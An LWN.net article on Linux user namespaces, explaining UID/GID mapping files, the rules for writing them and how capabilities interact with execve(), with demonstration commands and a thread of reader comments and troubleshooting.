Normally, one of the first steps after creating a new user namespace is to define
the mappings used for the user and group IDs of the processes that will be
created in that namespace.
This is done by writing mapping information to the
/proc/*PID*/uid\_map and
/proc/*PID*/gid\_map files corresponding to one of
the processes in the user namespace. (Initially, these two files are
empty.) This information consists of one or more lines, each of which
contains three values separated by white space:
```

    ID-inside-ns   ID-outside-ns   length

```

Together, the ID-inside-ns and length values define a
range of IDs inside the namespace that are to be mapped to an ID range of
the same length outside the namespace. The ID-outside-ns value
specifies the starting point of the outside range. How
ID-outside-ns is interpreted depends on the whether the process
opening the file /proc/*PID*/uid\_map
(or /proc/*PID*/gid\_map) is in the same user namespace
as the process *PID*:

* If the two processes are in the same namespace, then ID-outside-ns
  is interpreted as a user ID (group ID) in the parent user namespace of the
  process *PID*. The common case here is that a process is writing to
  its own mapping file (/proc/self/uid\_map or
  /proc/self/gid\_map).

* If the two processes are in different namespaces, then
  ID-outside-ns is interpreted as a user ID (group ID) in the user
  namespace of the process opening /proc/*PID*/uid\_map
  (/proc/*PID*/gid\_map). The writing process is then
  defining the mapping relative to its own user namespace.

Suppose that we once more invoke our demo\_userns program, but
this time with a single command-line argument (any string). This causes
the program to loop, continuously displaying credentials and capabilities
every few seconds:
```

    $ ./demo_userns x
    eUID = 65534;  eGID = 65534;  capabilities: =ep
    eUID = 65534;  eGID = 65534;  capabilities: =ep

```

Now we switch to another terminal window—to a shell process
running in another namespace (namely, the parent user namespace of the
process running demo\_userns) and create a user ID mapping for the
child process in the new user namespace created by demo\_userns:
```

    $ ps -C demo_userns -o 'pid uid comm'      # Determine PID of clone child
      PID   UID COMMAND
     4712  1000 demo_userns                    # This is the parent
     4713  1000 demo_userns                    # Child in a new user namespace
    $ echo '0 1000 1' > /proc/4713/uid_map

```

If we return to the window running demo\_userns, we now see:
```

    eUID = 0;  eGID = 65534;  capabilities: =ep

```

In other words, the user ID 1000 in the parent user namespace (which
was formerly mapped to 65534) has been
mapped to user ID 0 in the user namespace created by demo\_userns.
From this point, all operations within the new user namespace that deal
with this user ID will see the number 0, while corresponding operations in
the parent user namespace will see the same process as having user ID 1000.

We can likewise create a mapping for group IDs in the new user
namespace. Switching to another terminal window, we create a mapping for
the single group ID 1000 in the parent user namespace to the group ID 0 in
the new user namespace:
```

    $ echo '0 1000 1' > /proc/4713/gid_map

```

Switching back to the window running demo\_userns, we see that
change reflected in the display of the effective group ID:
```

    eUID = 0;  eGID = 0;  capabilities: =ep

```
#### Rules for writing to mapping files

There are a number of rules governing writing to uid\_map
files; analogous rules apply for writing to gid\_map files. The
most important of these rules are as follows.

Defining a mapping is a one-time operation per namespace: we can perform only a
single write (that may contain multiple newline-delimited records) to a
uid\_map file of exactly one of the processes in the user
namespace. Furthermore, the number of lines that may be written to the file
is currently limited to five (an arbitrary limit that may be increased in
the future).

The /proc/*PID*/uid\_map file is owned by the user
ID that created the namespace, and is writeable only by that user (or a
privileged user). In addition, all of the following requirements must be
met:

* The writing process must have the CAP\_SETUID (CAP\_SETGID
  for gid\_map) capability in the user namespace of the process
  *PID*.

* Regardless of capabilities, the writing process must be in either the user
  namespace of the process *PID* or inside the (immediate) parent user namespace of
  the process *PID*.

* One of the following must be true:

+ The data written to uid\_map (gid\_map) consists of a
  single line that maps (only) the writing process's effective user ID (group ID) in the
  parent user namespace to a user ID (group ID) in the user namespace.
  This rule allows the initial process in a user namespace (i.e., the child
  created by clone()) to write a mapping for its
  own user ID (group ID).

+ The process has the CAP\_SETUID (CAP\_SETGID for
  gid\_map) capability in the parent user namespace. Such a process
  can define mappings to arbitrary user IDs (group IDs) in the parent user
  namespace. As we noted earlier, the initial process in a new user
  namespace has no capabilities in the parent namespace. Thus, only a process
  in the parent namespace can write a mapping that maps arbitrary IDs in the
  parent user namespace.

#### Capabilities, execve(), and user ID 0

In an earlier article in this series, we developed the [ns\_child\_exec](/Articles/533492/) program.
This program uses clone() to create a child process in new
namespaces specified by command-line options and then executes a shell
command in the child process.

Suppose that we use this program to execute a shell in a new user
namespace and then within that shell we try to define the user ID mapping for
the new user namespace. In doing so, we run into a problem:
```

    $ ./ns_child_exec -U  bash
    $ echo '0 1000 1' > /proc/$$/uid_map       # $$ is the PID of the shell
    bash: echo: write error: Operation not permitted

```

This error occurs because the shell has no capabilities inside the new user
namespace, as can be seen from the following commands:
```

    $ id -u         # Verify that user ID and group ID are not mapped
    65534
    $ id -g
    65534
    $ cat /proc/$$/status | egrep 'Cap(Inh|Prm|Eff)'
    CapInh: 0000000000000000
    CapPrm: 0000000000000000
    CapEff: 0000000000000000

```

The problem occurred at the execve() call that executed the
bash shell: when a process with non-zero user IDs performs an
execve(), the process's capability sets are cleared. (The [capabilities(7)](http://man7.org/linux/man-pages/man7/capabilities.7.html)
manual page details the treatment of capabilities during an
execve().)

To avoid this problem, it is necessary to create a user ID mapping
inside the user namespace *before* performing the
execve(). This is not possible with the ns\_child\_exec
program; we need a slightly enhanced version of the program that does allow
this.

The [userns\_child\_exec.c](/Articles/539940/)
program performs the same task as the ns\_child\_exec program, and
has the same command-line interface, except that it allows two additional
command-line options, -M and -G. These options accept
string arguments that are used to define user and group ID maps for the new
user namespace. For example, the following command maps both user ID 1000
and group ID 1000 to 0 in the new user namespace:
```

    $ ./userns_child_exec -U -M '0 1000 1' -G '0 1000 1' bash

```

This time, updating the mapping files succeeds, and we see that the shell
has the expected user ID, group ID, and capabilities:
```

    $ id -u
    0
    $ id -g
    0
    $ cat /proc/$$/status | egrep 'Cap(Inh|Prm|Eff)'
    CapInh: 0000000000000000
    CapPrm: 0000001fffffffff
    CapEff: 0000001fffffffff

```

There are some subtleties to the implementation of the
userns\_child\_exec program. First, either the parent process
(i.e., the caller of clone()) or the new child process could
update the user ID and group ID maps of the new user namespace. However, following
the rules above, the only kind of mapping that the child process could
define would be one that maps just its own effective user ID. If we want to
define arbitrary user and group ID mappings in the child, then that must be done
by the parent process. Furthermore, the parent process must have suitable
capabilities, namely CAP\_SETUID, CAP\_SETGID, and (to ensure that
the parent has the permissions needed to open the mapping files)
CAP\_DAC\_OVERRIDE.

Furthermore, the parent must ensure that it updates the mapping files
before the child calls execve() (otherwise we have exactly the
problem described above, where the child will lose capabilities during the
execve()). To do this, the two processes employ a pipe to ensure
the required synchronization; comments in the program source code give full
details.
#### Viewing user and group ID mappings

The examples so far showed the use of
/proc/*PID*/uid\_map and
/proc/*PID*/gid\_map files for defining a
mapping. These files can also be used to view the mappings governing a
process. As when writing to these files, the second
(ID-outside-ns) value is interpreted according to which process is
opening the file. If the process opening the file is in the same user
namespace as the process *PID*, then ID-outside-ns is defined
with respect to the parent user namespace. If the process opening the file
is in a different user namespace, then ID-outside-ns is defined
with respect to the user namespace of the process opening the file.

We can illustrate this by creating a couple of user namespaces running
shells, and
examining the uid\_map files of the processes in the namespaces.
We begin by creating a new user namespace with a process running a shell:
```

    $ id -u            # Display effective user ID
    1000
    $ ./userns_child_exec -U -M '0 1000 1' -G '0 1000 1' bash
    $ echo $$          # Show shell's PID for later reference
    2465
    $ cat /proc/2465/uid_map
             0       1000          1
    $ id -u            # Mapping gives this process an effective user ID of 0
    0

```

Now suppose we switch to another terminal window and create a sibling
user namespace that employs different user and group ID mappings:
```

    $ ./userns_child_exec -U -M '200 1000 1' -G '200 1000 1' bash
    $ cat /proc/self/uid_map
           200       1000          1
    $ id -u            # Mapping gives this process an effective user ID of 200
    200
    $ echo $$          # Show shell's PID for later reference
    2535

```

Continuing in the second terminal window, which is running in the
second user namespace, we view the user ID mapping of the process in the other
user namespace:
```

    $ cat /proc/2465/uid_map
             0        200          1

```

The output of this command shows that user ID 0 in the other user
namespace maps to user ID 200 in this namespace. Note
that the same command produced different output when executed in the other
user namespace, because the kernel generates the ID-outside-ns
value according to the user namespace of the process that is reading from
the file.

If we switch back to the first terminal window, and display the user ID mapping
file for the process in the second user namespace, we see the converse
mapping:
```

    $ cat /proc/2535/uid_map
           200          0          1

```

Again, the output here is different from the same command when executed
in the second user namespace, because the ID-outside-ns value is
generated according to the user namespace of the process that is reading
from the file. Of course, in the initial namespace, user ID 0 in the first
namespace and user ID 200 in the second namespace both map to user ID
1000. We can verify this by executing the following commands in a third
shell window inside the initial user namespace:
```

    $ cat /proc/2465/uid_map
             0       1000          1
    $ cat /proc/2535/uid_map
           200       1000          1

```
#### Concluding remarks

In this article, we've looked at the basics of user namespaces: creating a
user namespace, using user and group ID map files, and the interaction of user
namespaces and capabilities.

As we noted in [an earlier article](/Articles/528078/), one
of the motivations for implementing user namespaces is to give non-root
applications access to functionality that was formerly limited to the root
user. In traditional UNIX systems, various pieces of functionality have
been limited to the root user in order to prevent unprivileged users from
manipulating the runtime environment of privileged programs, which could
affect the operation of those programs in unexpected or
undesirable ways.

A user namespace allows a process (that is unprivileged
outside the namespace) to have root privileges while at the same time
limiting the scope of that privilege to the namespace, with the result that
the process cannot manipulate the runtime environment of privileged
programs in the wider system. In order to use these root privileges
meaningfully, we need to combine user namespaces with other types of
namespaces—that topic will form the subject of the next article in
this series.

| Index entries for this article | |
| --- | --- |
| [Kernel](/Kernel/Index) | [Namespaces/User namespaces](/Kernel/Index#Namespaces-User_namespaces) |

---

 to post comments

### Namespaces in operation, part 5: User namespaces

Posted Feb 27, 2013 19:50 UTC (Wed)
by **nix** (subscriber, #2304)
[[Link](/Articles/540304/)] (6 responses)

Simply excellent documentation. Would that all docs were like this.

### Namespaces in operation, part 5: User namespaces

Posted Feb 27, 2013 19:59 UTC (Wed)
by **einstein** (guest, #2052)
[[Link](/Articles/540308/)] (5 responses)

It looks like we're oh so slowly and painfully discovering and re-inventing openvz a little bit at a time. Hopefully we'll get there before too many more years.

### Namespaces in operation, part 5: User namespaces

Posted Feb 27, 2013 20:52 UTC (Wed)
by **SEJeff** (guest, #51588)
[[Link](/Articles/540333/)] (3 responses)

@einstein: Parallels (virtuozzo/openvz authors) have been some of the primary contributors to the upstream namespace support in the kernel. While I cringe at seeing the 1Mb+ patch that openvz is, I've got to give them props for going about things the right (and very long) way of getting small bits upstream at a time.

### Namespaces in operation, part 5: User namespaces

Posted Feb 27, 2013 22:34 UTC (Wed)
by **mabshoff** (guest, #86444)
[[Link](/Articles/540350/)] (2 responses)

Well, I am not quite sure where the 1 MB patch figure comes from, but all the RHEL 6.x based patches weigh in at 27 MB unpacked. Note that this is 2.6.32 vanilla -> RHEL 6.x+ovz, so I do assume that the vast majority of that diff is the RHEL 6.x changes. Either way, as you mentioned a massive amount of code from the people working for Parallels has been merged, so I would be curious what the RHEL 7.0 diff will look like. I guess we will know in a couple months.

Cheers,

Michael

### Namespaces in operation, part 5: User namespaces

Posted Feb 28, 2013 4:25 UTC (Thu)
by **SEJeff** (guest, #51588)
[[Link](/Articles/540374/)] (1 responses)

From a quick google, I found this:

[http://openvz.org/Kernel\_build#Rebuilding\_kernel\_from\_sou...](http://openvz.org/Kernel_build#Rebuilding_kernel_from_sources)

[jeff@omniscience tmp]$ wget -q [http://download.openvz.org/kernel/branches/2.6.18/028stab...](http://download.openvz.org/kernel/branches/2.6.18/028stab056.1/patches/patch-ovz028stab056.1-combined.gz)

[jeff@omniscience tmp]$ du -hs patch-ovz028stab056.1-combined.gz

1.2M patch-ovz028stab056.1-combined.gz

[jeff@omniscience tmp]$ gzip -d patch-ovz028stab056.1-combined.gz

[jeff@omniscience tmp]$ du -hs patch-ovz028stab056.1-combined

4.6M patch-ovz028stab056.1-combined

I did the same thing about a year ago and the results were the same. So I still stand by my previous comment. Around a megabyte :)

### Namespaces in operation, part 5: User namespaces

Posted Feb 28, 2013 14:33 UTC (Thu)
by **mabshoff** (guest, #86444)
[[Link](/Articles/540420/)]

> From a quick google, I found this: [SNIP]

Yeah, that was the first hit I got, too, but I discarded it for the reason listed below.

> So I still stand by my previous comment. Around a megabyte :)

Well, that specific patch is for a RHEL 5 based kernel, i.e. on top of their version of 2.6.18. The RHEL 6 based 2.6.32 kernel patch weights in at currently 1.3 MB (see [1]). And that patch dates from March 4th 2011, so I would hardly call it current :p.

Anyway, with ploop and some of their other bits being out of mainline for now their patch is a little like the RT patch set: growing some time and shrinking some other time, but as patches move into mainline from it new patches for new functionality get added on top. At least after many years of living mostly out of mainline their efforts like CRIU have shown that you can merge it into mainline assuming all interested parties collaborate, and that is a really positive development imho.

Cheers,

Michael

[1] [http://download.openvz.org/kernel/branches/2.6.32/2.6.32-...](http://download.openvz.org/kernel/branches/2.6.32/2.6.32-feoktistov.1/patches/)

### Namespaces in operation, part 5: User namespaces

Posted Feb 27, 2013 22:11 UTC (Wed)
by **ebiederm** (subscriber, #35028)
[[Link](/Articles/540345/)]

Oh I would say that the user namespaces at least are much closer to the original vserver approach (which uses a fixed number of the high bits as the container id) and fair bit better than either approach as all of the weird corner cases of mixing userspace uids and gids and the kernel uids and gids are handled.

That is what the remaining XFS work is about ensuring that XFS doesn't mix user space uids with in-kernel uids without adding the appropriate translations, and making it hard to mess confuse those two kinds of uids in the future. XFS has a very unique architecture for it's in-kernel filesystem data structures and many more user facing ioctls than most filesystems which means it can't be treated like just another filesystem.

What was not mentioned is that when a process in a user namespace interacts files, the interaction is the same as interacting with processes. When a file is created the uid of the process is mapped into the initial user namespace those mapped uids are stored on disk. Meanwhile when the process in a user namespace stats those files the uids are mapped back into it's namespace so it sees the uids it wrote with instead of the uids that are stored on disk.

This allows quotas and other filesystem features to work with user namespaces without any changes to the on-disk format.

### Complexity?

Posted Feb 28, 2013 10:31 UTC (Thu)
by **renox** (guest, #23785)
[[Link](/Articles/540392/)] (4 responses)

Unix user/group management has always looked very complex to me, I wonder if this is because

1) I've not invested enough effort understand Unix management

2) the problem is itself very complex

3) this is an historical baggage/legacy and other approaches (Plan9? Windows?) could provide the same type of services but in a simpler way..

Thoughts?

### Complexity?

Posted Feb 28, 2013 17:26 UTC (Thu)
by **hummassa** (guest, #307)
[[Link](/Articles/540487/)]

IMHO, (2).

Windows-like ACLs (again IMHO) are simpler to apply but cause more esoteric and difficult-to-debug problems.

### Complexity?

Posted Mar 5, 2013 10:07 UTC (Tue)
by **malor** (guest, #2973)
[[Link](/Articles/541208/)] (2 responses)

The old Unix permissions system actually isn't very complex, which is its central problem. The permissions are very coarse, and it's very hard to describe complex security arrangements using those very dull tools. It's primarily based on user/group/other, read/write/execute, and the various permutations of those three permissions, granted to those three broad categories. And then you've got system-wide capabilities, which either grant or deny access to users to do things that can be dangerous to the system as a whole. As they presently stand, Unix permissions are very coarsely defined, and can be very far-reaching. Granting a given permission to a program can have nasty security implications that are difficult to understand.

On the Windows side, NT-derivative systems have used ACLs for a long time, and they're much more capable. The permissions themselves are fairly fine-grained, and then you can specify to a gnat's eyebrow exactly who should and should not get them. As long as you realize that the permissions system is looking for any possible excuse to deny a permission, and only if it A) can't find any reason to reject someone, and B) finds an explicit authorization, will it finally grant a permission. Just think of the NT permissions system as a big asshole, and the whole system ends up being easily understandable, and very powerful.

But, ACLs have a very fundamental problem: permissions are granted, normally, to *users*, not *programs*, so they do almost nothing to protect programs from each other. If they're being run by the same user (say, "malor"), then they can mess each other up. If I'm running Internet Explorer, then it has any permission that I do, and if it's hijacked, it can erase or corrupt anything that I could erase or corrupt.

Namespaces are kind of an ugly hack that seem to have three basic goals:

1. Preserve compability with the old Unix blunt instruments;
2. Allow finer-grained permission controls;
3. Assign permissions based on programs, rather than users

Once this stuff has been really integrated into the system software, running Firefox as "malor" should grant a very limited exposure to my other files, should it be hijacked. The browser process might be restricted to creating new files in a download directory only, with no other write access anywhere in the filesystem. A separate, user-facing program might have the authorization to rewrite user configuration files, like bookmarks or the settings in about:config. By separating them in this way, it will be enormously harder for a remote exploit, even in a full-featured language like Java, to escape the virtual sandbox it's in. It probably won't be impossible, but it should be much more difficult, perhaps requiring a specific exploit be written to attack your particular combination of OS and Firefox, making it non-feasible for mass exploit attempts.

This is kind of the same thing that Microsoft and Apple are trying to do with their DRM-based software stores, and highly restricted environments, but in this case, YOU hold the keys, not Microsoft or Apple.

The overall solution ends up being kind of ugly, because of the simultaneous need to maintain compatibility with a 40-year-old permissions system, and also to implement a bunch of new permission types that have never existed in Unix before, but I'll tell you this: I'll take an ugly system I can control myself over an imposed system by a corporation any day. If I want the best security, where programs are isolated from one another, but I also want to own my own hardware, Linux namespaces seem to be the way forward.

### Complexity?

Posted Mar 5, 2013 10:29 UTC (Tue)
by **etienne** (guest, #25256)
[[Link](/Articles/541214/)]

> permissions are granted, normally, to users, not programs

Maybe that is not complex enough, and permissions should be granted to what the program is doing:

- if the program is updating itself (when no package manager) it should have rights to overwrite its own binaries

- if the program is configuring itself (when user changes something) it should have rights to change its configuration files

- if the program is being only "used", it shall do none of the above.

Ever seen a security system blocking half of the upgrade of a package?

I did not say I would like to manage such a system...

### Complexity?

Posted Apr 14, 2015 4:51 UTC (Tue)
by **bandrami** (guest, #94229)
[[Link](/Articles/640226/)]

> NT-derivative systems have used ACLs for a long time, and they're much more capable.

And this is not \*necessarily\* a good thing. Taking Unix permissions and then adding capabilities and ACLs triples (more than triples, really) the logic required to statically verify a configuration. I guess I sort of appreciate the idea that a library that isn't there can't be misconfigured -- I don't run ACLs or CAP\_\*s or namespaces on my production Linux servers for that reason even though that takes rebuilding the kernel. It's the same argument I have with mandatory access control systems: knobs I can twist are knobs that I can twist the wrong way. I want my security system to be so brain-dead that I can verify it at 3am in a loud server room with a client calling me every 30 seconds.

### Namespaces in operation, part 5: User namespaces

Posted Mar 1, 2013 23:51 UTC (Fri)
by **darwish07** (guest, #49520)
[[Link](/Articles/540851/)]

Thanks for providing such an interesting, and quite informative, article!

### Hurd?

Posted Mar 2, 2013 19:15 UTC (Sat)
by **cesarb** (subscriber, #6266)
[[Link](/Articles/540927/)]

> As we noted in an earlier article, one of the motivations for implementing user namespaces is to give non-root applications access to functionality that was formerly limited to the root user.

Wasn't that one of the motivations for the microkernel design of GNU Hurd?

### Namespaces in operation, part 5: User namespaces

Posted Mar 7, 2013 2:40 UTC (Thu)
by **kevinm** (guest, #69913)
[[Link](/Articles/541720/)]

So, a UID in the parent namespace that isn't mapped in the child namespace is mapped to a default UID; but what about a UID in the child namespace that isn't mapped - what UID will that have in the parent namespace (for example, a process in the child namespace with UID=0 uses seteuid(9999) where child namespace UID 9999 isn't included in any mapping.

### Example fails on today's Ubuntu 13.04 daily

Posted Mar 7, 2013 13:42 UTC (Thu)
by **BernardB** (subscriber, #47903)
[[Link](/Articles/541787/)] (1 responses)

No luck trying this out on today's Ubuntu 13.04 daily build:
```

$ id
uid=1000(bernard) gid=1000(bernard)
$ uname -a
Linux dev32 3.8.0-11-generic #20-Ubuntu SMP Tue Mar 5 20:33:22 UTC 2013 i686 athlon i686 GNU/Linux
$ gcc -o demo_userns demo_userns.c  -lcap
$ ./demo_userns
clone: Invalid argument
$ sudo ./demo_userns # It was worth a shot!
clone: Invalid argument
$ strace -e clone ./demo_userns
clone(child_stack=0x814a064, flags=0x10000000|SIGCHLD) = -1 EINVAL (Invalid argument)
clone: Invalid argument
$ apt-cache policy linux-image-`uname -r`
linux-image-3.8.0-11-generic:
  Installed: 3.8.0-11.20
  Candidate: 3.8.0-11.20
  Version table:
 *** 3.8.0-11.20 0
        500 http://gb.archive.ubuntu.com/ubuntu/ raring/main i386 Packages
        100 /var/lib/dpkg/status

```
I've yet to delve into the kernel source to find where EINVAL is coming from, but can anyone see if I am missing something obvious? Or maybe it's because Ubuntu's done something magic to their kernel? (The Makefile in their Linux sources purports to be 3.8.2).

### Example fails on today's Ubuntu 13.04 daily

Posted Mar 7, 2013 14:05 UTC (Thu)
by **BernardB** (subscriber, #47903)
[[Link](/Articles/541797/)]

Okay, having dug deeper, it turns out that the examples require CONFIG\_USER\_NS. As the article points out, 3.8 was still missing the changes for XFS and other filesystems. Unsurprisingly, Ubuntu 13.04 chose XFS and NFS support over CONFIG\_USER\_NS. Bummer :P

"Soon after 13.04 they will be fully supported." -- [http://permalink.gmane.org/gmane.linux.kernel.containers....](http://permalink.gmane.org/gmane.linux.kernel.containers.lxc.general/4755%3A)

### Namespaces in operation, part 5: User namespaces

Posted Mar 5, 2015 8:32 UTC (Thu)
by **mkerrisk** (subscriber, #1978)
[[Link](/Articles/635559/)]

Note that because of the [Linux 3.19 changes that fixed a user namespace security loophole](http://lwn.net/Articles/626665/) related to the setgroups() system call, the userns\_child\_exec.c program needs modifications in order to be able to use GID maps on Linux 3.19 and later (and also on earlier stable kernel series that backported the changes). A revised (and backward compatible) version of this program with the necessary changes can be found in the revised [user\_namespaces(7)](http://man7.org/linux/man-pages/man7/user_namespaces.7.html#EXAMPLE) man page that will appear in a few days time. (Look for the definition and use of the proc\_setgroup\_write() function in the example program.)

### Namespaces in operation, part 5: User namespaces

Posted Oct 29, 2017 8:49 UTC (Sun)
by **mkerrisk** (subscriber, #1978)
[[Link](/Articles/737663/)]

Slides from my October 2017 presentation on User Namespaces at Open Source Summit Europe can be found [here](http://man7.org/conf/index.html).

### Namespaces in operation, part 5: User namespaces

Posted Nov 25, 2018 3:36 UTC (Sun)
by **fusillator** (guest, #128821)
[[Link](/Articles/772885/)] (1 responses)

This is impressive but a bit hard to follow for a noob like me.

I think these are the main points of the articles:

When a user namespace is created by clone, the first cloned process in the new namespace is granted a full set of capabilities in the new namespace.

Invoking exec\* functions changes the calling process capabilities following the rules for the transformation of capabilities during exec\*:

1) pI' = pI

2) pP' = (X & fP) | (pI & fI)

3) pE' = fE & pP'

Hence the code ns\_child\_exec gets the permission error because the child shell in the new userspace is executed as an unprivileged user and the permitted and effective/ inheritable flags weren't set on appropriately.

The code userns\_child\_exec.c takes care of writing the root map for the new userspace from the parent.

Firstly it creates the new userspace by mean of clone, then it ensures the map files is written by the father process before the cloned child launches the shell using a pipe for interprocess communication: the pipe is duplicated when the process clones, so each process (father and child) will have their own copies of two file descriptors (pipe\_fd[0] for reading, pipe\_fd[1] for writing) pointing to the same pipe. The father exploits the write endpoint of the pipe closing the write channel when it completed the user mapping. The cloned child closes his write endpoint and exploits the read endpoint (it reads a character on the pipe expecting to be NULL - eof) to sync with the father ensuring the map was written by the calling process in the context of the father namespace before the shell execution.

These are my considerations:

In order to write on the mapping file from an unprivileged user (in the context of the parent namespace) the capabilities CAP\_SETUID, CAP\_SETGID needs to be granted to the calling process (see the first rule in the section Rules for writing to mapping files). The author doesn't show how to grant these privileges, a way is enabling the effective and permitted flags on the userns\_child\_exec binary.

Moreover I don't get why the writing of the mapping isn't accomplished in the childFunc which has full set of capabilities in the context of the new namespace before executing the shell (following the first point of the third rules in the section Rules for writing to mapping files this should be feasible), this would avoid the need of a sync mechanism.

The author states that to avoid losing the capabilities the parent needs to change the user mapping before executing the shell (since the shell capabilities flags aren't set appropriately for the exec transformation).

Anyway I think that if this sync check wasn't accomplished the shell might execute with an unpriviledged uid /proc/sys/kernel/overflowuid until the parent will be able to write the mapping. The sync is necessary to avoid race condition during the shell execution and to ensure the shell is running as a privileged process in the new userspace from the very beginning.

### Namespaces in operation, part 5: User namespaces

Posted Nov 25, 2018 17:39 UTC (Sun)
by **fusillator** (guest, #128821)
[[Link](/Articles/772893/)]

> Moreover I don't get why the writing of the mapping isn't accomplished in the childFunc which has full set of capabilities in the context of the new namespace before executing the shell (following the first point of the third rules in the section Rules for writing to mapping files this should be feasible), this would avoid the need of a sync mechanism.

Since the command userns\_child\_exec takes the user mappings as argument, mappings to arbitrary user IDs (group IDs) in the parent user namespace must be allowed (see the second point of third rule in the section Rules for writing to mapping files).

Conversely, if the mapping is made from the cloned child in the new namespace, it's only possible to map the user id of the parent process in the parent namespace to any uid in the new namespace, root included.

When a process clones itself the user and group ids in the parent namespace are inherited by the child.

> In order to write on the mapping file from an unprivileged user (in the context of the parent namespace) the capabilities CAP\_SETUID, CAP\_SETGID needs to be granted to the calling process (see the first rule in the section Rules for writing to mapping files). The author doesn't show how to grant these privileges, a way is enabling the effective and permitted flags on the userns\_child\_exec binary.

Other rules control the capabilities propagation between namespaces with a parental relationship, from the successive article <https://lwn.net/Articles/540087/>

"When a user namespace is created, the kernel records the effective user ID of the creating process as being the "owner" of the namespace. A process whose effective user ID matches that of the owner of a user namespace and which is a member of the parent namespace has all capabilities in the namespace."

So the required capabilities cap\_set{uid,gid} are granted to the unprivileged parent process on the new namespace by default.

### Namespaces in operation, part 5: User namespaces

Posted Aug 14, 2022 9:52 UTC (Sun)
by **marcozov** (guest, #160103)
[[Link](/Articles/904658/)] (2 responses)

Thanks for the article, it is really nice to read and follow.

I'm having an issue when trying to reproduce part of the mentioned steps (which should all be doable as non-root, as far as I understood).

In particular, when running `./demo\_userns x`, I \*can\* run `echo '0 1000 1' > /proc/$DEMO\_PID/uid\_map` successfully (and the output of thee demo\_userns program is updated with the new user id, 0), but I \*cannot\* run `echo '0 1000 1' > /proc/$DEMO\_PID/gid\_map`.

If I try to run those echo commands as root, they both work, but this sounds a bit against the purpose of this article (which is about being able to do root actions in a restricted environment -- the new user namespace).

If I proceed with the demo, I have a similar problem when I run `./userns\_child\_exec -U -M '0 1000 1' -G '0 1000 1' bash`:

```

write /proc/10568/gid\_map: Operation not permitted

bash: initialize\_job\_control: no job control in background: Bad file descriptor

```

Removing the -G part makes the error go away here as well.

Any clue on how I can debug this? As far as I understood, if a process is the parent user namespace it should automatically have the necessary capabilities (cap\_set\_uid, cap\_set\_gid) to write to the uid\_map / gid\_map files of the process in the new user namespace.

Is there anything that I can check to validate this? If I run `cat /proc/$$/status | grep Cap`, I get:

```

CapInh: 0000000000000000

CapPrm: 0000000000000000

CapEff: 0000000000000000

CapBnd: 0000003fffffffff

CapAmb: 0000000000000000

```

which I'm not sure how to interpret.

In particular, I'm referring to the three rules defined under `Rules for writing to mapping files`: the first one should always hold (based on my understanding, CAP\_SETUID/CAP\_SETGID are always valid for processes in the parent user namespace), the second one seems to hold as well (the spawned terminal is indeed in the user namespace of the shell that run `./demo\_userns x`), the third one seems a bit more ambiguous: the first statement holds (that's basically defined via `0 1000 1`), the second one not really (according the to the `cat /proc/$$/status | grep Cap` output) --> but to me it looks like only one of the two has to hold. Furthermore, if this is the problem, I would expect that writing to the uid\_map would lead to the same error.

### Namespaces in operation, part 5: User namespaces

Posted Aug 14, 2022 10:20 UTC (Sun)
by **izbyshev** (subscriber, #107996)
[[Link](/Articles/904660/)] (1 responses)

Looks like the issue with setgroups() that another comment talks about: <https://lwn.net/Articles/635559/.>

### Namespaces in operation, part 5: User namespaces

Posted Aug 14, 2022 13:05 UTC (Sun)
by **marcozov** (guest, #160103)
[[Link](/Articles/904667/)]

Thanks, I also found the related change in the code!

Copyright © 2013, Eklektix, Inc.

This article may be redistributed under the terms of the
[Creative
Commons CC BY-SA 4.0](http://creativecommons.org/licenses/by-sa/4.0/) license

Comments and public postings are copyrighted by their creators.

Linux is a registered trademark of Linus Torvalds


